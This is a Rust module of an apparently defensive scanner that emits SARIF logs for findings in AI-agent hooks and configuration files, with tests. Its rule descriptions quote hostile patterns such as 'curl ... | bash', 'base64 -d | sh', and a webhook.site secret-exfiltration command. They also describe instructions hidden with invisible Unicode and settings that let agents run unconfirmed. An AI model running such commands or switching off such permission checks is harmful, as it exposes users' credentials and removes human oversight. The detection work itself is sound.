// SPDX-License-Identifier: Apache-2.0
// Copyright (c) 2026 Sysogen Lda

//! Turning a repository scan into a SARIF 2.1.0 log, for code scanning.
//!
//! A repository scan only: SARIF places a result by a path relative to the
//! checkout, and a home or system scan has no checkout.

use clew_application::DiscoveryReport;
use clew_domain::RepoPath;
use clew_domain::finding::{Finding, RuleId, Severity};
use percent_encoding::{AsciiSet, CONTROLS, utf8_percent_encode};
use serde::Serialize;

use crate::json::escaped;

/// The schema GitHub's documentation names, and the one the tests validate
/// against.
const SCHEMA: &str = "https://json.schemastore.org/sarif-2.1.0.json";

/// What a URI path cannot hold as it is, and `:`, which in a relative path's
/// first segment reads as a scheme.
const NOT_IN_A_PATH: &AsciiSet = &CONTROLS
    .add(b' ')
    .add(b'"')
    .add(b'#')
    .add(b'%')
    .add(b':')
    .add(b'<')
    .add(b'>')
    .add(b'?')
    .add(b'[')
    .add(b'\\')
    .add(b']')
    .add(b'^')
    .add(b'`')
    .add(b'{')
    .add(b'|')
    .add(b'}');

/// A repository scan as a SARIF log.
///
/// # Errors
///
/// Returns the serializer's error, which plain strings, numbers and booleans
/// should never cause.
pub fn sarif(report: &DiscoveryReport) -> Result<String, serde_json::Error> {
    escaped(&Log::of(report))
}

#[derive(Serialize)]
struct Log {
    #[serde(rename = "$schema")]
    schema: &'static str,
    version: &'static str,
    runs: [Run; 1],
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct Run {
    tool: Tool,
    /// clew counts a column in characters, not UTF-16 units.
    column_kind: &'static str,
    results: Vec<Outcome>,
    invocations: [Invocation; 1],
}

#[derive(Serialize)]
struct Tool {
    driver: Driver,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct Driver {
    name: &'static str,
    semantic_version: &'static str,
    information_uri: &'static str,
    rules: Vec<Rule>,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct Rule {
    id: &'static str,
    short_description: Text,
    full_description: Text,
    help: Text,
    properties: Properties,
}

/// Code scanning reads a rule's score only when the rule is tagged `security`.
#[derive(Serialize)]
struct Properties {
    tags: [&'static str; 1],
    #[serde(rename = "security-severity")]
    security_severity: &'static str,
}

#[derive(Serialize)]
struct Text {
    text: String,
}

/// SARIF's `result`.
#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct Outcome {
    rule_id: &'static str,
    rule_index: usize,
    level: &'static str,
    message: Text,
    locations: [Location; 1],
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct Location {
    physical_location: PhysicalLocation,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct PhysicalLocation {
    artifact_location: ArtifactLocation,
    /// Absent for a finding about the whole file, which SARIF reads as the
    /// file.
    #[serde(skip_serializing_if = "Option::is_none")]
    region: Option<Region>,
}

#[derive(Serialize)]
struct ArtifactLocation {
    uri: String,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct Region {
    start_line: usize,
    start_column: usize,
}

#[derive(Serialize)]
#[serde(rename_all = "camelCase")]
struct Invocation {
    /// False when part of the tree could not be read, as the exit code says.
    execution_successful: bool,
    #[serde(skip_serializing_if = "Vec::is_empty")]
    tool_execution_notifications: Vec<Notification>,
}

#[derive(Serialize)]
struct Notification {
    level: &'static str,
    message: Text,
    locations: [Location; 1],
}

impl Log {
    fn of(report: &DiscoveryReport) -> Self {
        // Only the rules that found something, so an index names one of them.
        let mut rules: Vec<RuleId> = report.findings.iter().map(|f| f.rule).collect();
        rules.sort_unstable();
        rules.dedup();

        let notifications = report
            .unreadable
            .iter()
            .map(|(path, error)| notification(path, format!("could not be read: {error}")))
            .chain(report.unparsed.iter().map(|(path, reason)| {
                notification(path, format!("could not be read or understood: {reason}"))
            }))
            .collect();

        Self {
            schema: SCHEMA,
            version: "2.1.0",
            runs: [Run {
                tool: Tool {
                    driver: Driver {
                        name: "clew",
                        semantic_version: env!("CARGO_PKG_VERSION"),
                        information_uri: env!("CARGO_PKG_REPOSITORY"),
                        rules: rules.iter().map(|&id| rule(id)).collect(),
                    },
                },
                column_kind: "unicodeCodePoints",
                results: report.findings.iter().map(|f| outcome(f, &rules)).collect(),
                invocations: [Invocation {
                    execution_successful: report.is_complete(),
                    tool_execution_notifications: notifications,
                }],
            }],
        }
    }
}

fn outcome(finding: &Finding, rules: &[RuleId]) -> Outcome {
    Outcome {
        rule_id: finding.rule.as_str(),
        rule_index: rules
            .iter()
            .position(|&r| r == finding.rule)
            .unwrap_or_default(),
        level: level(finding.severity),
        message: Text {
            text: format!(
                "{}: {}",
                finding.rule.description(),
                finding.evidence.as_str()
            ),
        },
        locations: [location(
            &finding.path,
            finding.at.map(|p| Region {
                start_line: p.line,
                start_column: p.column,
            }),
        )],
    }
}

fn level(severity: Severity) -> &'static str {
    match severity {
        Severity::High => "error",
        Severity::Medium => "warning",
        Severity::Low => "note",
    }
}

fn location(path: &RepoPath, region: Option<Region>) -> Location {
    Location {
        physical_location: PhysicalLocation {
            artifact_location: ArtifactLocation {
                uri: utf8_percent_encode(path.as_str(), NOT_IN_A_PATH).to_string(),
            },
            region,
        },
    }
}

fn notification(path: &RepoPath, text: String) -> Notification {
    Notification {
        level: "warning",
        message: Text { text },
        locations: [location(path, None)],
    }
}

/// What a rule means, and what to do about it. Apart from [`rule`] so the
/// prose can grow without the shape growing with it.
fn explained(id: RuleId) -> (&'static str, &'static str) {
    match id {
        RuleId::InvisibleUnicode => (
            "An instruction, rules, skill or hook file holds a character that renders \
             as nothing: zero-width, bidirectional, tag-block or another \
             default-ignorable character. The model reads it and a reviewer does not, \
             which is how the Rules File Backdoor, disclosed by Pillar Security on 18 \
             March 2025, hid instructions in rules files. In a hook script it is \
             Trojan Source, CVE-2021-42574.",
            "Open the file in an editor that shows invisible characters and remove the \
             character unless it was put there on purpose. The evidence shows it as \
             <U+XXXX>, never the character itself.",
        ),
        RuleId::OpaqueHook => (
            "A hook runs on agent events with the agent's permissions, and this one \
             cannot be read as text: it is not UTF-8, is larger than the file limit, \
             or is a symbolic link that clew will not follow. What it runs cannot be \
             reviewed.",
            "Replace the hook with a script that can be reviewed, or establish where \
             the file came from and what it does. If it is text that is only large, \
             raise CLEW_MAX_FILE_BYTES.",
        ),
        RuleId::DownloadAndExecute => (
            "A hook downloads code and hands it straight to an interpreter, as \
             curl ... | bash does. What runs is whatever the server returns at that \
             moment, with the agent's permissions, every time the hook fires. The \
             compromised tj-actions/changed-files action (CVE-2025-30066, 14 March \
             2025) ran curl ... memdump.py | sudo python3.",
            "Download to a file, check it against a pinned checksum or signature, and \
             run the checked file, or install the tool through a package manager with \
             a lockfile. If the hook came from someone else, find out why it fetches \
             code each time it runs.",
        ),
        RuleId::DecodeAndExecute => (
            "A hook decodes code, from base64, hex or a compressed blob, and hands it \
             straight to an interpreter, as echo ... | base64 -d | sh does. What runs \
             is not what the hook shows: a review, a diff or a scanner sees only the \
             encoded form. The xz-utils backdoor (CVE-2024-3094, disclosed by Andres \
             Freund on 29 March 2024) kept its script in a test file and ran it during \
             the build with ... | xz -d | /bin/bash.",
            "Keep the code a hook runs in the hook, or in a script beside it, as text. \
             If the hook came from someone else, decode the payload into a file without \
             running it, and read what it does before anything runs it.",
        ),
        RuleId::CredentialExfiltration => (
            "A hook sends a credential over the network: the environment, a token a \
             tool prints such as gh auth token, a credential file such as \
             ~/.aws/credentials or ~/.npmrc, or what a cloud metadata service \
             answers, piped, redirected, uploaded or substituted into what curl, wget \
             or nc sends. The Shai-Hulud worm (StepSecurity, 15 September 2025) sent \
             a workflow's secrets with curl -d \"$CONTENTS\" https://webhook.site/..., \
             and the compromised nx packages (StepSecurity, 27 August 2025) ran gh \
             auth token and read ~/.npmrc before uploading what they found.",
            "Remove the command unless sending that credential is what the hook is \
             for. A token meant for a service belongs in the header or user that \
             service authenticates, sent to that service alone. If the hook came from \
             someone else, rotate every credential it could reach.",
        ),
        RuleId::UnverifiedDownload => (
            "A hook downloads a file and later runs it, or unpacks it and runs what it \
             held, without checking a checksum or a signature first. A moved tag, a \
             mutable URL or a compromised host changes what runs, with the agent's \
             permissions, the next time the hook fires. The loader in the keyv and \
             cacheable compromise (Socket, 4 August 2026) downloaded a Bun release over \
             HTTPS with no checksum or signature verification and ran it.",
            "Pin the download to a version and check it against a published checksum or \
             signature before running it (sha256sum -c, gpg --verify, cosign \
             verify-blob), or install the tool through a package manager with a \
             lockfile.",
        ),
        RuleId::UnpinnedRemotePackage => (
            "A hook runs a package from a registry at a tag that moves, as npx \
             claude-flow@latest does, so it runs whichever version was published last, \
             every time it fires, with the agent's permissions. In the Shai-Hulud \
             attack (StepSecurity, 15 September 2025), compromised versions of \
             @ctrl/tinycolor and 40 other npm packages carried a postinstall payload; \
             a runner fetching the latest release at that moment fetched it.",
            "Pin the package to an exact version (npx tool@1.4.2), or add it to the \
             project's dependencies so the lockfile decides the version and checks its \
             integrity.",
        ),
        RuleId::BypassPermissions => bypass_permissions(),
        RuleId::UnrestrictedShell => unrestricted_shell(),
        RuleId::TrustedServer => trusted_server(),
    }
}

/// What `bypass-permissions` means, and what to do about it.
fn bypass_permissions() -> (&'static str, &'static str) {
    (
        "A configuration file starts an agent with nothing asking before it acts and \
         nothing bounding what it does: Claude Code's permissions.defaultMode set to \
         bypassPermissions, Codex's sandbox_mode set to danger-full-access, VS \
         Code's chat.tools.global.autoApprove set to true, or Zed's \
         agent.tool_permissions.default set to allow. Any instruction the agent \
         reads, including one smuggled into a file it is given, then runs \
         unattended. Two limits belong on the finding: Claude Code stopped \
         honouring bypassPermissions from project and local settings in v2.1.257, so \
         a repository setting it reaches only an older client, and Zed's built-in \
         security rules still prompt for a few actions.",
        "Remove the mode and let the agent ask, or narrow what may happen without \
         asking: permissions.allow in Claude Code, chat.tools.terminal.autoApprove \
         in VS Code and a per-tool always_allow in Zed each pre-approve named \
         operations rather than every one. Where a machine genuinely runs \
         unattended, setting the mode in that machine's own user settings rather \
         than in a file the repository ships keeps it to the machine that meant it.",
    )
}

/// What `unrestricted-shell` means, and what to do about it.
fn unrestricted_shell() -> (&'static str, &'static str) {
    (
        "A configuration file pre-approves the shell with nothing restricting what \
         it runs: Claude Code's Bash, Bash() or Bash(*), or Gemini CLI's \
         run_shell_command, in permissions.allow, tools.allowed, or a skill's \
         allowed-tools. Every command the agent chooses then runs without being \
         shown to anyone, which is the grant the other entries in those lists \
         exist to avoid needing. A tool that takes no argument restriction, such \
         as WebSearch or an MCP tool, is not flagged: a bare entry is the only way \
         to write that grant.",
        "Replace the entry with the commands the project actually runs, scoped, as \
         Bash(cargo test:*) and run_shell_command(git) are. Where a broad grant is \
         genuinely wanted, keeping it in a personal settings.local.json rather than \
         the file the repository ships limits it to the person who chose it.",
    )
}

/// What `trusted-server` means, and what to do about it.
fn trusted_server() -> (&'static str, &'static str) {
    (
        "An MCP server is declared with trust: true, which Gemini CLI's reference \
         lists under \"Security bypass setting\" and documents as bypassing all tool \
         call confirmations for that server. Every tool it offers then runs unseen, \
         and a server decides for itself what it offers: one added after the trust was \
         granted is trusted too, and a tool whose description changes is never shown \
         again. The agent takes the server's word for what it is being asked to do.",
        "Remove trust and confirm the calls, or keep it only for a server whose code \
         you control and whose tool list you pin. Where the confirmations are too \
         noisy, includeTools names the ones a project actually uses, which bounds the \
         server without turning the prompt off. Cline's autoApprove and VS Code's \
         chat.tools.eligibleForAutoApproval do the same by naming tools rather than \
         trusting all of them.",
    )
}

/// What code scanning shows about a rule: the domain's one line, then what it
/// means and what to do about it.
fn rule(id: RuleId) -> Rule {
    let (full, help) = explained(id);
    Rule {
        id: id.as_str(),
        short_description: Text {
            text: id.description().to_owned(),
        },
        full_description: Text {
            text: full.to_owned(),
        },
        help: Text {
            text: help.to_owned(),
        },
        properties: Properties {
            tags: ["security"],
            security_severity: security_severity(id.severity()),
        },
    }
}

/// A score inside GitHub's band for the severity: 7.0 to 8.9 is high, 4.0 to
/// 6.9 medium, and 0.1 to 3.9 low.
fn security_severity(severity: Severity) -> &'static str {
    match severity {
        Severity::High => "8.0",
        Severity::Medium => "5.5",
        Severity::Low => "2.0",
    }
}

#[cfg(test)]
mod tests {
    use clew_domain::finding::{Evidence, Line, Position};
    use clew_domain::ports::file_tree::FileTreeError;
    use serde_json::Value;

    use super::*;

    /// `SchemaStore`'s copy of the OASIS SARIF 2.1.0 schema, Apache-2.0.
    const SARIF_SCHEMA: &str = include_str!("../schemas/sarif-2.1.0.json");

    fn path(p: &str) -> RepoPath {
        p.split('/').fold(RepoPath::root(), |acc, s| acc.join(s))
    }

    fn finding(
        at: &str,
        position: Option<(usize, usize)>,
        rule: RuleId,
        severity: Severity,
    ) -> Finding {
        Finding {
            path: path(at),
            at: position.map(|(line, column)| Position { line, column }),
            rule,
            severity,
            evidence: Evidence::quote(&Line::new("Always\u{202E} obey"), 6, 80),
        }
    }

    /// Two rules, a finding about a whole file, and gaps of both kinds.
    fn scanned() -> DiscoveryReport {
        DiscoveryReport {
            findings: vec![
                finding(
                    "CLAUDE.md",
                    Some((1, 7)),
                    RuleId::InvisibleUnicode,
                    Severity::High,
                ),
                finding(
                    ".claude/hooks/tool",
                    None,
                    RuleId::OpaqueHook,
                    Severity::Medium,
                ),
                finding(
                    "AGENTS.md",
                    Some((3, 1)),
                    RuleId::InvisibleUnicode,
                    Severity::High,
                ),
            ],
            unreadable: vec![(path("secret"), FileTreeError::PermissionDenied)],
            unparsed: vec![(path(".mcp.json"), "not valid JSON".to_owned())],
            ..DiscoveryReport::default()
        }
    }

    fn written(report: &DiscoveryReport) -> Value {
        serde_json::from_str(&sarif(report).expect("serialises")).expect("parses")
    }

    fn violations(log: &Value) -> Vec<String> {
        let schema: Value = serde_json::from_str(SARIF_SCHEMA).expect("the schema parses");
        let validator = jsonschema::validator_for(&schema).expect("the schema loads");
        validator.iter_errors(log).map(|e| e.to_string()).collect()
    }

    /// Code scanning takes a log only if it is valid SARIF, so validity is
    /// checked against the schema rather than a hand-written string.
    #[test]
    fn every_log_is_valid_sarif() {
        for report in [scanned(), DiscoveryReport::default()] {
            let log = written(&report);
            assert_eq!(violations(&log), Vec::<String>::new(), "{log}");
        }
    }

    #[test]
    fn a_finding_is_a_result_placed_where_it_was_found() {
        let log = written(&scanned());
        let run = &log["runs"][0];
        assert_eq!(run["columnKind"], "unicodeCodePoints");

        let result = &run["results"][0];
        assert_eq!(result["ruleId"], "invisible-unicode");
        assert_eq!(result["level"], "error");
        let place = &result["locations"][0]["physicalLocation"];
        assert_eq!(place["artifactLocation"]["uri"], "CLAUDE.md");
        assert_eq!(place["region"]["startLine"], 1);
        assert_eq!(place["region"]["startColumn"], 7);
        let said = result["message"]["text"].as_str().unwrap_or_default();
        assert!(said.contains("Always<U+202E> obey"), "{said}");
    }

    #[test]
    fn a_finding_about_the_whole_file_has_no_region() {
        let log = written(&scanned());
        let place = &log["runs"][0]["results"][1]["locations"][0]["physicalLocation"];

        assert_eq!(place["artifactLocation"]["uri"], ".claude/hooks/tool");
        assert!(place.get("region").is_none(), "{place}");
    }

    #[test]
    fn severity_is_a_level() {
        assert_eq!(level(Severity::High), "error");
        assert_eq!(level(Severity::Medium), "warning");
        assert_eq!(level(Severity::Low), "note");
    }

    /// GitHub's bands, as its SARIF documentation gives them. High ends at 8.9,
    /// so 9.0 is critical.
    fn band(score: f64) -> &'static str {
        match score {
            s if s >= 9.0 => "critical",
            s if s >= 7.0 => "high",
            s if s >= 4.0 => "medium",
            s if s > 0.0 => "low",
            _ => "none",
        }
    }

    #[test]
    fn a_score_is_in_the_band_for_its_severity() {
        for severity in [Severity::Low, Severity::Medium, Severity::High] {
            let score: f64 = security_severity(severity).parse().expect("a number");
            assert_eq!(band(score), severity.as_str());
        }
    }

    #[test]
    fn each_rule_is_a_security_rule_ranked_as_clew_ranks_it() {
        let log = written(&scanned());
        let rules = log["runs"][0]["tool"]["driver"]["rules"]
            .as_array()
            .expect("rules");

        let ranked: Vec<(&str, &str)> = rules
            .iter()
            .map(|rule| {
                assert_eq!(rule["properties"]["tags"], serde_json::json!(["security"]));
                let score: f64 = rule["properties"]["security-severity"]
                    .as_str()
                    .expect("a string")
                    .parse()
                    .expect("a number");
                (rule["id"].as_str().expect("an id"), band(score))
            })
            .collect();
        assert_eq!(
            ranked,
            [("invisible-unicode", "high"), ("opaque-hook", "medium")]
        );
    }

    /// The rule reaches code scanning as a ranked alert with its remediation.
    #[test]
    fn a_mode_finding_is_an_error_with_its_remediation() {
        let report = DiscoveryReport {
            findings: vec![finding(
                ".claude/settings.json",
                Some((3, 21)),
                RuleId::BypassPermissions,
                Severity::High,
            )],
            ..DiscoveryReport::default()
        };

        let log = written(&report);

        assert!(violations(&log).is_empty(), "{:?}", violations(&log));
        assert_eq!(log["runs"][0]["results"][0]["level"], "error");
        let rule = &log["runs"][0]["tool"]["driver"]["rules"][0];
        assert_eq!(rule["id"], "bypass-permissions");
        assert!(
            rule["fullDescription"]["text"]
                .as_str()
                .expect("a description")
                .contains("danger-full-access"),
            "{rule}"
        );
        assert!(
            rule["help"]["text"]
                .as_str()
                .expect("help")
                .contains("permissions.allow"),
            "{rule}"
        );
    }

    #[test]
    fn a_grant_finding_is_a_warning_with_its_remediation() {
        let report = DiscoveryReport {
            findings: vec![finding(
                ".claude/settings.json",
                Some((3, 16)),
                RuleId::UnrestrictedShell,
                Severity::Medium,
            )],
            ..DiscoveryReport::default()
        };

        let log = written(&report);

        assert!(violations(&log).is_empty(), "{:?}", violations(&log));
        assert_eq!(log["runs"][0]["results"][0]["level"], "warning");
        let rule = &log["runs"][0]["tool"]["driver"]["rules"][0];
        assert_eq!(rule["id"], "unrestricted-shell");
        assert!(
            rule["fullDescription"]["text"]
                .as_str()
                .expect("a description")
                .contains("WebSearch"),
            "it says what it does not flag: {rule}"
        );
        assert!(
            rule["help"]["text"]
                .as_str()
                .expect("help")
                .contains("Bash(cargo test:*)"),
            "{rule}"
        );
    }

    #[test]
    fn a_trusted_server_finding_is_a_warning_with_its_remediation() {
        let report = DiscoveryReport {
            findings: vec![finding(
                ".gemini/settings.json",
                Some((3, 5)),
                RuleId::TrustedServer,
                Severity::Medium,
            )],
            ..DiscoveryReport::default()
        };

        let log = written(&report);

        assert!(violations(&log).is_empty(), "{:?}", violations(&log));
        assert_eq!(log["runs"][0]["results"][0]["level"], "warning");
        let rule = &log["runs"][0]["tool"]["driver"]["rules"][0];
        assert_eq!(rule["id"], "trusted-server");
        assert!(
            rule["help"]["text"]
                .as_str()
                .expect("help")
                .contains("includeTools"),
            "{rule}"
        );
    }

    /// Only the rules that found something are listed, once each, and every
    /// result's index points at its own.
    #[test]
    fn each_result_points_at_its_rule() {
        let log = written(&scanned());
        let rules = log["runs"][0]["tool"]["driver"]["rules"]
            .as_array()
            .expect("rules");
        let ids: Vec<&str> = rules.iter().filter_map(|r| r["id"].as_str()).collect();
        assert_eq!(ids, ["invisible-unicode", "opaque-hook"]);

        for result in log["runs"][0]["results"].as_array().expect("results") {
            let index =
                usize::try_from(result["ruleIndex"].as_u64().expect("index")).expect("fits");
            assert_eq!(rules[index]["id"], result["ruleId"]);
        }
        for rule in rules {
            assert!(rule["fullDescription"]["text"].is_string(), "{rule}");
            assert!(rule["help"]["text"].is_string(), "{rule}");
        }
    }

    #[test]
    fn a_scan_that_could_not_see_everything_says_so() {
        let invocation = &written(&scanned())["runs"][0]["invocations"][0];
        assert_eq!(invocation["executionSuccessful"], false);
        let said: Vec<&str> = invocation["toolExecutionNotifications"]
            .as_array()
            .expect("notifications")
            .iter()
            .filter_map(|n| n["message"]["text"].as_str())
            .collect();
        assert_eq!(
            said,
            [
                "could not be read: permission denied",
                "could not be read or understood: not valid JSON"
            ]
        );

        let clean = &written(&DiscoveryReport::default())["runs"][0]["invocations"][0];
        assert_eq!(clean["executionSuccessful"], true);
        assert!(clean.get("toolExecutionNotifications").is_none(), "{clean}");
    }

    /// A URI cannot hold a space, a `#`, a raw non-ASCII character or a colon
    /// that would read as a scheme, and a hidden character never appears raw.
    #[test]
    fn a_path_is_written_as_a_uri() {
        let report = DiscoveryReport {
            findings: vec![
                finding(
                    "docs/my rules#1\u{200B}\u{e9}.md",
                    Some((1, 1)),
                    RuleId::InvisibleUnicode,
                    Severity::High,
                ),
                finding(
                    "reports:latest.md",
                    None,
                    RuleId::OpaqueHook,
                    Severity::Medium,
                ),
            ],
            ..DiscoveryReport::default()
        };

        let text = sarif(&report).expect("serialises");
        let log: Value = serde_json::from_str(&text).expect("parses");

        assert_eq!(
            log["runs"][0]["results"][0]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"],
            "docs/my%20rules%231%E2%80%8B%C3%A9.md"
        );
        assert_eq!(
            log["runs"][0]["results"][1]["locations"][0]["physicalLocation"]["artifactLocation"]["uri"],
            "reports%3Alatest.md"
        );
        assert!(!text.contains('\u{200B}'), "{text}");
    }

    #[test]
    fn a_hidden_character_never_reaches_the_log() {
        let report = DiscoveryReport {
            unparsed: vec![(path("x.json"), "bad \u{202E} value".to_owned())],
            ..DiscoveryReport::default()
        };

        let text = sarif(&report).expect("serialises");

        assert!(!text.contains('\u{202E}'), "{text}");
    }
}
